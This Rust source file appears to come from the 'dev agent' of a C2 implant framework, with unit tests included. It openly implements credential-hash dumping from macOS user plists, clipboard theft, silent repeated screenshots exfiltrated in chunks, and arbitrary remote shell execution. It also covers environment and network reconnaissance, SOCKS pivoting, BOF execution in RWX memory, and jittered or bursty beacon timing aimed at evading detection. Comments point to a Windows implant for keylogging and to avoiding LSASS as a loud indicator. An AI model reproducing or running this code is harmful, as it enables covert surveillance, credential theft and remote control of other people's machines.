/// 解析端口规格："22,80,443" 或 "1-1000" → Vec<u16>。
fn parse_ports(spec: &str) -> Vec<u16> {
    let mut out = Vec::new();
    for part in spec.split(',') {
        let part = part.trim();
        if let Some((lo, hi)) = part.split_once('-') {
            if let (Ok(lo), Ok(hi)) = (lo.trim().parse::<u16>(), hi.trim().parse::<u16>()) {
                for p in lo..=hi {
                    out.push(p);
                }
            }
        } else if let Ok(p) = part.parse::<u16>() {
            out.push(p);
        }
    }
    out.sort();
    out.dedup();
    out
}

/// 网络信息收集。query 选择要收集的内容。
fn do_net(query: &str) -> Response {
    let cmd = match query {
        "interfaces" | "ifconfig" | "" => ("ifconfig", &["-a"][..]),
        "routes" | "route" | "netstat" => ("netstat", &["-rn"][..]),
        "arp" => ("arp", &["-a"][..]),
        "connections" | "conn" => ("netstat", &["-an"][..]),
        other => return Response::Err(format!("net: unknown query '{other}'")),
    };
    match std::process::Command::new(cmd.0).args(cmd.1).output() {
        Ok(out) => Response::Output(out.stdout),
        Err(e) => Response::Err(format!("net {query}: {e}")),
    }
}

/// 磁盘信息。macOS/Windows: df，附带 macOS diskutil list。
fn do_driveinfo() -> Response {
    let mut out = String::new();
    if let Ok(o) = std::process::Command::new("df").arg("-h").output() {
        out.push_str(&String::from_utf8_lossy(&o.stdout));
    }
    Response::Output(out.into_bytes())
}

/// 剪贴板。macOS: pbpaste。
fn do_clipboard() -> Response {
    #[cfg(target_os = "macos")]
    {
        match std::process::Command::new("pbpaste").output() {
            Ok(o) => Response::Output(o.stdout),
            Err(e) => Response::Err(format!("clipboard: {e}")),
        }
    }
    #[cfg(not(target_os = "macos"))]
    {
        Response::Err("clipboard: not supported on this OS".into())
    }
}

/// 环境变量。name 空串=全部。
fn do_env(name: &str) -> Response {
    if name.is_empty() {
        // 全部：env 命令
        match std::process::Command::new("env").output() {
            Ok(o) => Response::Output(o.stdout),
            Err(e) => Response::Err(format!("env: {e}")),
        }
    } else {
        match std::env::var(name) {
            Ok(v) => Response::Output(format!("{name}={v}\n").into_bytes()),
            Err(_) => Response::Err(format!("env: {name} not set")),
        }
    }
}

/// 跑一个 shell 命令返回 stdout 文本（do_net 的 fallback 用）。
#[allow(dead_code)] // no longer called after M9 fallback fix; kept for reference
fn run_shell_raw(args: &str) -> String {
    #[cfg(unix)]
    {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(args)
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
            .unwrap_or_else(|e| format!("! {e}"))
    }
    #[cfg(not(unix))]
    {
        let _ = args;
        String::from("(shell not available on this OS)")
    }
}

/// 键盘记录。macOS 上需要 Accessibility 权限 + CoreGraphics CGEventTap，
/// dev agent（无 GUI session）无法干净实现。返回明确的平台限制说明。
/// action: 0=start, 1=stop, 2=dump。
fn do_keylog(action: u8) -> Response {
    match action {
        0 => Response::Err("keylog start: requires Accessibility permission + CGEventTap (not available in dev agent). Use the Windows PIC implant for keylogging.".into()),
        1 => Response::Ok, // stop：无状态，直接 Ok
        2 => Response::Err("keylog dump: no active keylogger session (dev agent limitation)".into()),
        _ => Response::Err("keylog: invalid action".into()),
    }
}

/// 持续截屏：截 `interval_secs` 秒间隔的多张，分块流回。
/// 简化实现：截 3 张（覆盖一个间隔周期），实际生产应后台定时任务。
/// macOS-only：`screencapture` 是 macOS 自带工具，Linux 没有该二进制，
/// 因此仅 macOS 走截屏路径，其余平台直接返回明确错误。
fn do_screenwatch(interval_secs: u32) -> Vec<Response> {
    let interval = interval_secs.max(1) as u64;
    #[allow(unused_mut)] // mut only needed on macos where chunks are pushed
    let mut all_chunks = Vec::new();
    // 截 3 张演示持续监控
    for i in 0..3u32 {
        if i > 0 {
            std::thread::sleep(std::time::Duration::from_secs(interval));
        }
        #[cfg(target_os = "macos")]
        {
            let tmp = format!("/tmp/nyx_sw_{}_{}.png", std::process::id(), i);
            let r = std::process::Command::new("screencapture")
                .arg("-x")
                .arg(&tmp)
                .output();
            if let Ok(out) = r {
                if out.status.success() {
                    if let Ok(data) = std::fs::read(&tmp) {
                        let _ = std::fs::remove_file(&tmp);
                        const CHUNK: usize = 128 * 1024;
                        let name = format!("screenwatch-{i}.png");
                        for (seq, block) in data.chunks(CHUNK).enumerate() {
                            let eof = if (seq + 1) * CHUNK >= data.len() {
                                1
                            } else {
                                0
                            };
                            all_chunks.push(Response::FileChunk {
                                name: name.clone(),
                                seq: seq as u32,
                                eof,
                                data: block.to_vec(),
                            });
                        }
                    }
                }
            }
        }
    }
    if all_chunks.is_empty() {
        vec![Response::Err(
            "screenwatch: screencapture not available".into(),
        )]
    } else {
        all_chunks
    }
}

/// 凭据哈希提取。method 语义跨后端统一约定：
///   0 = SAM hive（Windows-only，dev agent 不支持）
///   1 = SYSTEM hive（Windows-only，dev agent 不支持）
///   2 = LSASS dump（deferred，所有后端暂不支持）
///   3 = macOS shadow hash（读 /var/db/dslocal/nodes/Default/users/<user>.plist）
fn do_hashdump(method: u8) -> Response {
    match method {
        0 | 1 => Response::Err(
            "hashdump sam/system: Windows-only (use the Windows implant). Dev agent supports method=3 (shadow).".into(),
        ),
        2 => Response::Err(
            "hashdump lsass: deferred (loudest IOC). Use SAM(0)+SYSTEM(1) on Windows, decrypt offline.".into(),
        ),
        3 => {
            // macOS: 提取所有本地用户的 shadow hash
            #[cfg(target_os = "macos")]
            {
                let dir = "/var/db/dslocal/nodes/Default/users";
                let mut results = Vec::new();
                if let Ok(entries) = std::fs::read_dir(dir) {
                    for entry in entries.flatten() {
                        let name = entry.file_name();
                        let name_str = name.to_string_lossy();
                        if !name_str.ends_with(".plist") { continue; }
                        let user = name_str.trim_end_matches(".plist");
                        // Read the plist file directly instead of shelling out (M9:
                        // the old `sh -c` interpolated `user` into the command
                        // string → command injection via a crafted username).
                        let plist_path = format!("/var/db/dslocal/nodes/Default/users/{user}.plist");
                        let plist_data = std::fs::read(&plist_path);
                        let plist_hex = plist_data
                            .map(|d| hex::encode(&d))
                            .unwrap_or_default();
                        let truncated = if plist_hex.len() > 256 {
                            &plist_hex[..256]
                        } else {
                            &plist_hex
                        };
                        // dscl gets `user` as a separate argv element (no shell),
                        // so an attacker-controlled username can't break out.
                        let dscl = std::process::Command::new("dscl")
                            .args([".", "-read", &format!("/Users/{user}"), "AuthenticationOptions"])
                            .output();
                        let mut combined = String::new();
                        if let Ok(out) = dscl {
                            combined
                                .push_str(&String::from_utf8_lossy(&out.stdout));
                        }
                        combined.push_str(truncated);
                        if !combined.trim().is_empty() {
                            results.push(format!("{user}:{combined}"));
                        }
                    }
                }
                if results.is_empty() {
                    Response::Err("hashdump: no local user hashes found (may need root)".into())
                } else {
                    Response::Output(results.join("\n").into_bytes())
                }
            }
            #[cfg(not(target_os = "macos"))]
            {
                Response::Err("hashdump shadow: macOS-only".into())
            }
        }
        _ => Response::Err("hashdump: invalid method".into()),
    }
}

/// 执行文件系统操作。路径相对 work_dir 解析，过 `safe_resolve` 防穿越
/// （与 upload/download 一致：拒绝绝对路径和 `..`）。
fn do_fileop(op: FileOp, work_dir: &Path, path: &str, dest: Option<&str>) -> Response {
    use std::fs;
    let full = match safe_resolve(work_dir, path) {
        Ok(p) => p,
        Err(e) => return Response::Err(format!("{op:?}: {path}: {e}")),
    };
    let dest_full = match dest {
        Some(d) => match safe_resolve(work_dir, d) {
            Ok(p) => Some(p),
            Err(e) => return Response::Err(format!("{op:?}: {d}: {e}")),
        },
        None => None,
    };
    match op {
        FileOp::Cd => {
            if full.is_dir() {
                Response::Ok
            } else {
                Response::Err(format!("cd: not a directory: {path}"))
            }
        }
        FileOp::Mkdir => match fs::create_dir_all(&full) {
            Ok(()) => Response::Ok,
            Err(e) => Response::Err(format!("mkdir {path}: {e}")),
        },
        FileOp::Rm => {
            // 守卫：拒绝删除 work_dir 本体（path="." 或空会解析到 work_dir）。
            // canonicalize 两侧：safe_resolve 返回规范化路径，而 work_dir 可能
            // 是未规范化的（如 macOS 的 /var → /private/var 软链），直接比较
            // 会漏掉 "."。
            let work_canon = work_dir
                .canonicalize()
                .unwrap_or_else(|_| work_dir.to_path_buf());
            if full == work_canon {
                return Response::Err("rm: refusing to remove work root".into());
            }
            if full.is_dir() {
                match fs::remove_dir_all(&full) {
                    Ok(()) => Response::Ok,
                    Err(e) => Response::Err(format!("rm {path}: {e}")),
                }
            } else {
                match fs::remove_file(&full) {
                    Ok(()) => Response::Ok,
                    Err(e) => Response::Err(format!("rm {path}: {e}")),
                }
            }
        }
        FileOp::Mv => match dest_full {
            Some(d) => match fs::rename(&full, d) {
                Ok(()) => Response::Ok,
                Err(e) => Response::Err(format!("mv {path}: {e}")),
            },
            None => Response::Err("mv: missing dest".into()),
        },
        FileOp::Cp => match dest_full {
            Some(d) => match fs::copy(&full, d) {
                Ok(_) => Response::Ok,
                Err(e) => Response::Err(format!("cp {path}: {e}")),
            },
            None => Response::Err("cp: missing dest".into()),
        },
        FileOp::Ls => {
            // 列目录：每行一个条目，目录加 '/' 后缀（UI 的 ls 解析器认这个
            // 约定，见 client-ui-web FileTable.parseLsLines）。
            match fs::read_dir(&full) {
                Ok(entries) => {
                    let mut lines: Vec<String> = Vec::new();
                    for entry in entries.flatten() {
                        let name = entry.file_name().to_string_lossy().into_owned();
                        let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
                        if is_dir {
                            lines.push(format!("{name}/"));
                        } else {
                            lines.push(name);
                        }
                    }
                    lines.sort();
                    Response::Output(lines.join("\n").into_bytes())
                }
                Err(e) => Response::Err(format!("ls {path}: {e}")),
            }
        }
    }
}

/// SOCKS5 relay control is handled by `crate::pivot` (the std port of the
/// implant's channel table): op 1 = CONNECT, op 2 = BIND, others rejected.
/// Pack a `Vec<String>` of BOF args into the CS beacon.h wire format so a
/// BOF's `BeaconDataParse`/`BeaconGetStr` can read them: each arg is
/// `[u32 tag][u32 len][bytes]` (BEACON_ARG_TYPE_STRING = 3). Mirrors
/// implant-win's `pack_args`; the empty slice packs to an empty blob (the
/// bof-runner passes a NULL buffer + 0 for no-args BOFs per the CS ABI
/// `void go(char *args, int alen)`).
// Only reachable from the windows cfg-block of `bof_execute`, but kept
// compiled on all platforms so the host-side wire-format test runs in
// macOS/Linux CI.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
fn pack_bof_args(args: &[String]) -> Vec<u8> {
    let mut out = Vec::new();
    for a in args {
        out.extend_from_slice(&3u32.to_le_bytes()); // BEACON_ARG_TYPE_STRING
        out.extend_from_slice(&(a.len() as u32).to_le_bytes());
        out.extend_from_slice(a.as_bytes());
    }
    out
}

/// Run a BOF (Windows/Wine via nyx-bof-runner) and return its BeaconPrintf
/// output. On non-Windows the dev agent can't execute COFF machine code.
fn bof_execute(blob: &[u8], args: &[String]) -> Response {
    #[cfg(target_os = "windows")]
    {
        // BOF execution runs in RWX memory + calls externals through COFF
        // relocations. The agent's main beacon-loop thread may already have a
        // deep call stack (tokio/ureq/serde), so running the BOF inline can
        // overflow the default 1 MiB Windows thread stack. Spawn a fresh thread
        // with a generous 4 MiB stack to give the BOF + Beacon-API shim plenty
        // of headroom.
        let blob_owned = blob.to_vec();
        let args_blob = pack_bof_args(args);
        match std::thread::Builder::new()
            .stack_size(4 * 1024 * 1024)
            .spawn(move || nyx_bof_runner::execute(&blob_owned, &args_blob))
        {
            Ok(handle) => match handle.join() {
                Ok(Ok(r)) => Response::BofOutput(r.output.into_bytes()),
                Ok(Err(e)) => Response::Err(format!("bof: {e}")),
                Err(_) => Response::Err("bof: thread panicked".into()),
            },
            Err(e) => Response::Err(format!("bof: failed to spawn thread: {e}")),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = blob;
        let _ = args;
        Response::Err("bof: not supported by the dev agent on this OS".into())
    }
}

/// Cap on `run_shell` output (stdout + stderr, combined). Without a bound a
/// `Response::Output` blob can exceed `wire::MAX_BLOB_LEN` (256 KiB), which
/// would abort the beacon loop under the `panic = "abort"` discipline (or be
/// silently swapped for an Err by `encode_batch`). 4 MiB is far beyond any
/// legitimate task output; anything larger is truncated and marked.
const SHELL_OUTPUT_CAP: usize = 4 * 1024 * 1024;

/// Marker appended when a shell command's combined output exceeds
/// [`SHELL_OUTPUT_CAP`], so the operator knows the result is incomplete.
const SHELL_OUTPUT_TRUNCATED: &str = "\n...[output truncated at 4 MiB]...\n";

/// Apply the shell-output cap: truncate to [`SHELL_OUTPUT_CAP`] and append
/// [`SHELL_OUTPUT_TRUNCATED`] when the combined stdout+stderr exceeded it.
/// Standalone so the truncation contract is unit-testable on every host
/// (the `run_shell` process spawn itself is per-OS).
fn cap_shell_output(mut buf: Vec<u8>) -> Vec<u8> {
    if buf.len() > SHELL_OUTPUT_CAP {
        buf.truncate(SHELL_OUTPUT_CAP);
        buf.extend_from_slice(SHELL_OUTPUT_TRUNCATED.as_bytes());
    }
    buf
}

fn run_shell(args: &str) -> Response {
    #[cfg(unix)]
    let (prog, flag) = ("sh", "-c");
    #[cfg(windows)]
    let (prog, flag) = ("cmd.exe", "/C");
    match std::process::Command::new(prog)
        .arg(flag)
        .arg(args)
        .output()
    {
        Ok(out) => {
            let mut buf = out.stdout;
            buf.extend_from_slice(&out.stderr);
            Response::Output(cap_shell_output(buf))
        }
        Err(e) => Response::Err(e.to_string()),
    }
}

/// Largest `FileChunk` payload the dev agent emits (mirrors a typical beacon MTU).
const CHUNK: usize = 65_536;

fn do_upload(work_dir: &Path, name: &str, data: &[u8]) -> Response {
    match safe_resolve(work_dir, name) {
        Err(e) => Response::Err(e),
        Ok(path) => {
            if let Some(parent) = path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            match std::fs::write(&path, data) {
                Ok(_) => Response::Ok,
                Err(e) => Response::Err(e.to_string()),
            }
        }
    }
}

fn do_download(work_dir: &Path, path: &str) -> Vec<Response> {
    let resolved = match safe_resolve(work_dir, path) {
        Err(e) => return vec![Response::Err(e)],
        Ok(p) => p,
    };
    let data = match std::fs::read(&resolved) {
        Ok(d) => d,
        Err(e) => return vec![Response::Err(e.to_string())],
    };
    let name = Path::new(path)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(path)
        .to_string();
    let mut chunks = Vec::new();
    let mut seq = 0u32;
    let mut i = 0;
    while i < data.len() {
        let end = (i + CHUNK).min(data.len());
        let eof = u8::from(end == data.len());
        chunks.push(Response::FileChunk {
            name: name.clone(),
            seq,
            eof,
            data: data[i..end].to_vec(),
        });
        seq += 1;
        i = end;
    }
    if chunks.is_empty() {
        // An empty file still gets a single (empty) chunk so the operator sees EOF.
        chunks.push(Response::FileChunk {
            name,
            seq: 0,
            eof: 1,
            data: Vec::new(),
        });
    }
    chunks
}

/// Resolve a remote path under `work_dir`, refusing absolute paths and `..`
/// components so uploads/downloads cannot escape the sandbox.
/// 解析远程路径到 work_dir 下，拒绝绝对路径、`..` 穿越、以及通过 symlink
/// 逃出沙箱的路径。canonicalize 防护：即使路径不含字面 `..`，如果中间有
/// symlink 指向外部，也会被拒。
///
/// Returns the canonicalized (symlink-resolved) path, so the caller operates
/// on the exact target that was validated — closing the check→use TOCTOU
/// window where a symlink could be swapped after validation but before use.
fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
    let p = Path::new(remote);
    if p.is_absolute() {
        return Err("absolute paths are not allowed".into());
    }
    if p.components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Err("`..` traversal is not allowed".into());
    }
    let joined = work_dir.join(p);
    // canonicalize 防护：resolve 所有 symlink 后确认仍在 work_dir 内。
    // work_dir 本身必须存在且可 canonicalize（agent 启动时保证）。
    let canon_work = work_dir
        .canonicalize()
        .map_err(|e| format!("work_dir canonicalize failed: {e}"))?;
    // 目标可能还不存在（Mkdir），所以 canonicalize 父目录 + 拼最后一段。
    let resolved = match joined.canonicalize() {
        Ok(c) => c,
        Err(_) => {
            // 路径不存在——逐级向上找最近的存在的祖先，canonicalize 它，
            // 再拼回剩余部分。这样深层新路径（Mkdir 的 a/b/c）也能校验。
            let mut ancestor = joined.parent().unwrap_or(work_dir).to_path_buf();
            let mut tail: Vec<std::ffi::OsString> = Vec::new();
            while !ancestor.exists() {
                if let Some(name) = ancestor.file_name() {
                    tail.push(name.to_os_string());
                    ancestor = ancestor.parent().unwrap_or(work_dir).to_path_buf();
                } else {
                    break;
                }
            }
            match ancestor.canonicalize() {
                Ok(cp) => {
                    let mut full = cp;
                    while let Some(t) = tail.pop() {
                        full.push(t);
                    }
                    full.push(joined.file_name().unwrap_or_default());
                    full
                }
                Err(_) => return Err(format!("path ancestor not resolvable: {remote}")),
            }
        }
    };
    if !resolved.starts_with(&canon_work) {
        return Err("path escapes sandbox (symlink traversal?)".into());
    }
    // TOCTOU fix: return the RESOLVED path (all symlinks canonicalized above),
    // not the raw `joined`. The caller then operates on exactly the path that
    // was validated, instead of re-following a symlink that could be swapped
    // between the check and the use.
    Ok(resolved)
}

fn jitter_sleep(seconds: u32, jitter_pct: u8) -> Duration {
    let base = seconds.max(1) as i64;
    if jitter_pct == 0 {
        return Duration::from_secs(base as u64);
    }
    let max_jitter = base * jitter_pct as i64 / 100;
    let span = (2 * max_jitter + 1) as u64;
    // offset in [-max_jitter, +max_jitter]
    let offset = (rand::random::<u64>() % span) as i64 - max_jitter;
    let secs = (base + offset).max(1) as u64;
    Duration::from_secs(secs)
}

/// `bursty` cadence (profile `set timing_baseline "bursty"`): BURST_LEN
/// short-interval cycles fire back-to-back, then one full-length sleep is the
/// quiet gap before the next burst. Pure logic (no sleeping) so the cadence
/// shape is unit-testable.
fn bursty_sleep(cycle: u32, base: Duration) -> Duration {
    const BURST_LEN: u32 = 4;
    if cycle % (BURST_LEN + 1) == BURST_LEN {
        base // quiet gap after a burst
    } else {
        // In-burst interval: a fraction of the base, floored so a tiny
        // sleeptime can't spin the loop.
        (base / 8).max(Duration::from_millis(500))
    }
}

fn hostname() -> String {
    std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| "host".into())
}

fn username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "user".into())
}

fn os_string() -> String {
    #[cfg(target_os = "macos")]
    {
        "macOS".into()
    }
    #[cfg(target_os = "linux")]
    {
        "Linux".into()
    }
    #[cfg(target_os = "windows")]
    {
        "Windows".into()
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    {
        "unknown".into()
    }
}

fn arch_code() -> u8 {
    #[cfg(target_arch = "x86_64")]
    {
        0
    }
    #[cfg(target_arch = "aarch64")]
    {
        1
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        2
    }
}

fn is_admin() -> u8 {
    let u = std::env::var("USER").unwrap_or_default();
    u8::from(u == "root")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn bursty_cadence_alternates_short_bursts_and_long_gaps() {
        // 间隔序列性质(不真睡):每 5 个周期一次长睡眠(cycle 4、9),其余为短突发间隔。
        let base = Duration::from_secs(60);
        let seq: Vec<Duration> = (0..10).map(|c| bursty_sleep(c, base)).collect();
        for (i, d) in seq.iter().enumerate() {
            if i % 5 == 4 {
                assert_eq!(*d, base, "cycle {i} should be the long gap");
            } else {
                assert!(*d < base, "cycle {i} should be a short in-burst interval");
                assert!(
                    *d >= Duration::from_millis(500),
                    "cycle {i} above the floor"
                );
            }
        }
        // base 很小时短间隔也有下限,不会忙循环。
        assert_eq!(
            bursty_sleep(0, Duration::from_millis(100)),
            Duration::from_millis(500)
        );
    }

    /// 建 work_dir 临时目录 + 一个子文件，返回 (tempdir, work_dir_path)。
    fn setup_workdir() -> (tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().to_path_buf();
        fs::create_dir_all(work.join("sub")).unwrap();
        fs::write(work.join("existing.txt"), "data").unwrap();
        (dir, work)
    }

    #[test]
    fn safe_resolve_rejects_absolute() {
        let (_t, work) = setup_workdir();
        assert!(safe_resolve(&work, "/etc/passwd").is_err());
        assert!(safe_resolve(&work, "/tmp").is_err());
    }

    #[test]
    fn safe_resolve_rejects_dotdot() {
        let (_t, work) = setup_workdir();
        assert!(safe_resolve(&work, "../x").is_err());
        assert!(safe_resolve(&work, "sub/../../etc").is_err());
        assert!(safe_resolve(&work, "../../etc/passwd").is_err());
    }

    #[test]
    fn safe_resolve_accepts_relative() {
        let (_t, work) = setup_workdir();
        // 正常相对路径（已存在的文件）
        let r = safe_resolve(&work, "existing.txt").unwrap();
        assert!(r.ends_with("existing.txt"));
        // 正常相对路径（已存在的目录）
        let r = safe_resolve(&work, "sub").unwrap();
        assert!(r.ends_with("sub"));
    }

    #[test]
    fn safe_resolve_accepts_new_path_for_mkdir() {
        // Mkdir 场景：路径还不存在，但要能 resolve（canonicalize 父目录）
        let (_t, work) = setup_workdir();
        let r = safe_resolve(&work, "newdir/nested").unwrap();
        assert!(r.starts_with(&work) || r.to_string_lossy().contains("newdir"));
    }

    #[test]
    fn safe_resolve_rejects_symlink_escape() {
        // 在 work_dir 内建一个指向外部的 symlink，试图穿越
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().join("sandbox");
        fs::create_dir_all(&work).unwrap();
        fs::write(work.join("real.txt"), "ok").unwrap();
        // symlink → /tmp（沙箱外）
        let outside = dir.path().join("outside.txt");
        fs::write(&outside, "secret").unwrap();
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(&outside, work.join("escape.link")).unwrap();
            // 通过 symlink 访问外部文件 → 必须被拒
            assert!(
                safe_resolve(&work, "escape.link").is_err(),
                "symlink 逃逸必须被 safe_resolve 拒绝"
            );
        }
    }

    #[test]
    fn do_fileop_rm_rejects_dot() {
        // rm "." 应被 work_dir 守卫拒绝（不能删沙箱根）
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().to_path_buf();
        fs::create_dir_all(&work).unwrap();
        let resp = do_fileop(FileOp::Rm, &work, ".", None);
        assert!(
            matches!(resp, Response::Err(ref e) if e.contains("work root")),
            "rm . 应被拒，got: {resp:?}"
        );
    }

    #[test]
    fn do_fileop_mkdir_creates_dir() {
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().to_path_buf();
        let resp = do_fileop(FileOp::Mkdir, &work, "newdir", None);
        assert!(matches!(resp, Response::Ok));
        assert!(work.join("newdir").exists());
    }

    #[test]
    fn do_fileop_mv_moves_file() {
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().to_path_buf();
        fs::write(work.join("src.txt"), "x").unwrap();
        let resp = do_fileop(FileOp::Mv, &work, "src.txt", Some("dst.txt"));
        assert!(matches!(resp, Response::Ok));
        assert!(!work.join("src.txt").exists());
        assert!(work.join("dst.txt").exists());
    }

    #[test]
    fn do_connect_rejects_non_tcp_proto() {
        // Only proto 0 (TCP) is supported; anything else must surface as an
        // error rather than attempting a connection.
        let resp = crate::pivot::do_connect(7, "127.0.0.1", 80, 42);
        assert!(
            matches!(resp, Response::Err(ref e) if e.contains("proto")),
            "non-TCP proto should be rejected, got: {resp:?}"
        );
    }

    #[test]
    fn do_connect_unresolvable_host_is_err() {
        // A hostname that can't resolve must come back as Err (host resolution
        // failed), not panic or hang.
        let resp = crate::pivot::do_connect(0, "nx-host-does-not-exist-invalid", 80, 1);
        assert!(
            matches!(resp, Response::Err(ref e) if e.contains("resolution")),
            "unresolvable host should be Err, got: {resp:?}"
        );
    }

    #[test]
    fn do_connect_closed_port_is_err() {
        // 127.0.0.1:1 is a privileged port nothing should be listening on;
        // connect must fail and we must surface it as Err within the timeout.
        let resp = crate::pivot::do_connect(0, "127.0.0.1", 1, 9);
        assert!(
            matches!(resp, Response::Err(_)),
            "closed port should be Err, got: {resp:?}"
        );
    }

    #[test]
    fn do_socks_rejects_unsupported_op() {
        // Only op 1 (CONNECT) and op 2 (BIND) are supported.
        let resp = crate::pivot::do_socks(5, 9, "127.0.0.1", 1080);
        assert!(
            matches!(resp, Response::Err(ref e) if e.contains("op")),
            "unsupported socks op should be Err, got: {resp:?}"
        );
    }

    #[test]
    fn do_socks_connect_opens_real_channel() {
        // op 1 (CONNECT) opens a REAL relay channel against a local listener:
        // the socket must stay in the table so ChannelData/pump can use it.
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        // The channel table is thread-local, so this test's table is private.
        let chan: u32 = 55;
        let resp = crate::pivot::do_socks(chan, 1, "127.0.0.1", port);
        assert!(
            matches!(resp, Response::Channel { status: 0, .. }),
            "socks connect to a live listener must open a channel, got: {resp:?}"
        );
        // ChannelData then flows to the listener.
        assert_eq!(crate::pivot::channel_data(chan, b"ping"), Response::Ok);
        let mut buf = [0u8; 4];
        use std::io::Read as _;
        listener.accept().unwrap().0.read_exact(&mut buf).unwrap();
        assert_eq!(&buf, b"ping");
        crate::pivot::channel_close(chan);
    }

    #[test]
    fn run_shell_truncates_oversized_output() {
        // The cap helper is the platform-independent core of run_shell: the
        // process spawn differs per OS, the truncation contract does not.
        let capped = cap_shell_output(vec![b'x'; SHELL_OUTPUT_CAP + 4096]);
        assert_eq!(
            capped.len(),
            SHELL_OUTPUT_CAP + SHELL_OUTPUT_TRUNCATED.len()
        );
        assert_eq!(
            &capped[SHELL_OUTPUT_CAP..],
            SHELL_OUTPUT_TRUNCATED.as_bytes()
        );
        // Under-cap output passes through untouched.
        assert_eq!(cap_shell_output(b"hi".to_vec()), b"hi");
    }

    #[test]
    fn safe_resolve_returns_canonical_target() {
        // TOCTOU: safe_resolve must return the symlink-RESOLVED path, so the
        // caller operates on the validated target, not a re-followed link.
        #[cfg(unix)]
        {
            let dir = tempfile::tempdir().unwrap();
            let work = dir.path().join("sandbox");
            fs::create_dir_all(&work).unwrap();
            fs::write(work.join("real.txt"), "ok").unwrap();
            let inside = work.join("inside-link");
            std::os::unix::fs::symlink(work.join("real.txt"), &inside).unwrap();
            let r = safe_resolve(&work, "inside-link").unwrap();
            assert_eq!(r, work.join("real.txt").canonicalize().unwrap());
        }
        #[cfg(not(unix))]
        {
            let (_t, work) = setup_workdir();
            let r = safe_resolve(&work, "existing.txt").unwrap();
            assert!(r.ends_with("existing.txt"));
        }
    }

    #[test]
    fn encode_batch_replaces_oversized_blob_with_err() {
        // A response whose blob exceeds MAX_BLOB_LEN must not abort the loop:
        // encode_batch replaces it with a bounded Response::Err so the batch
        // still encodes and the operator sees what was dropped.
        let mut batch = vec![
            TaskResponse {
                task_id: 1,
                response: Response::Output(vec![0u8; nyx_protocol::wire::MAX_BLOB_LEN + 1]),
            },
            TaskResponse {
                task_id: 2,
                response: Response::Ok,
            },
        ];
        let encoded = encode_batch(&mut batch);
        assert!(
            !encoded.is_empty(),
            "batch must still encode after the Err swap"
        );
        assert!(
            matches!(&batch[0].response, Response::Err(m) if m.contains("MAX_BLOB_LEN")),
            "oversized response must be replaced with an explanatory Err"
        );
        // The swapped batch encodes cleanly on a direct call too (the retry
        // inside encode_batch always succeeds).
        assert!(
            TaskResponse::encode_vec(&batch).is_ok(),
            "post-swap batch must encode cleanly"
        );
        // A small payload passes through untouched (same bytes as encode_vec).
        let expected = TaskResponse {
            task_id: 3,
            response: Response::Output(b"hi".to_vec()),
        };
        let mut small = vec![TaskResponse {
            task_id: 3,
            response: Response::Output(b"hi".to_vec()),
        }];
        assert_eq!(
            encode_batch(&mut small),
            TaskResponse::encode_vec(&[expected]).unwrap()
        );
        assert!(
            matches!(&small[0].response, Response::Output(d) if d == b"hi"),
            "small payload must be left untouched"
        );
    }

    #[test]
    fn pack_bof_args_matches_cs_wire_format() {
        // Each arg is [u32 tag=3][u32 len][bytes] (BEACON_ARG_TYPE_STRING).
        let packed = pack_bof_args(&["abc".into(), "".into()]);
        assert_eq!(&packed[0..4], &3u32.to_le_bytes());
        assert_eq!(&packed[4..8], &3u32.to_le_bytes());
        assert_eq!(&packed[8..11], b"abc");
        assert_eq!(&packed[11..15], &3u32.to_le_bytes());
        assert_eq!(&packed[15..19], &0u32.to_le_bytes());
        assert_eq!(packed.len(), 19);
        // No args → empty blob (bof-runner passes NULL + 0 per the CS ABI).
        assert!(pack_bof_args(&[]).is_empty());
    }

    /// BUG-1 fixture: build the exact frame the team server returns to a
    /// mid-flush `link.post` — pending tasks packed into a ServerToClient
    /// reply — plus the session key the agent opens it with.
    fn make_mid_flush_reply(tasks: &[Task], counter: u64) -> (SessionKey, Vec<u8>) {
        let implant = ImplantKeypair::generate().unwrap();
        let server = nyx_protocol::ServerKeypair::generate().unwrap();
        let key = implant.session_key(&server.public_bytes()).unwrap();
        let frame = encode_frame_dir(
            &server.public_bytes(),
            Direction::ServerToClient,
            counter,
            &key,
            &Task::encode_vec(tasks).unwrap(),
        )
        .unwrap();
        (key, frame)
    }

    #[test]
    fn mid_flush_reply_tasks_are_recovered_not_dropped() {
        // Regression for BUG-1: the server packs newly-queued tasks into every
        // beacon reply, including mid-flush `link.post` replies during a
        // streamed screenshot/download. The old fire-and-forget post dropped
        // the reply body, losing tasks already dequeued server-side.
        let tasks = vec![
            Task {
                task_id: 3,
                command: Command::Hashdump { method: 0 },
            },
            Task {
                task_id: 4,
                command: Command::GetUid,
            },
        ];
        let (key, reply) = make_mid_flush_reply(&tasks, 41);
        assert_eq!(
            open_reply_tasks(&key, &reply),
            Some(tasks.clone()),
            "tasks riding a mid-flush reply must decode"
        );
        // defer_reply_tasks queues them behind the current batch.
        let mut deferred: Vec<Task> = Vec::new();
        defer_reply_tasks(&key, &reply, &mut deferred);
        assert_eq!(
            deferred, tasks,
            "mid-flush tasks must be deferred, not lost"
        );
    }

    #[test]
    fn mid_flush_reply_without_tasks_is_not_an_error() {
